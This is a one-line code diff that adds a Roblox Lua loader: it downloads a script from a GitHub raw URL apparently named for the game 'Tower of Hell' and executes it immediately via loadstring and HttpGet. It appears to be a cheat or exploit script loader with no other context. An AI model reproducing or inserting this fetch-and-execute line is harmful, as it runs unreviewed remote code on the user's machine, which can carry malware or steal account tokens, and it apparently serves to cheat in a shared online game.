@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rinqedd/rblx/main/scripts/Tower%20of%20Hell"))()
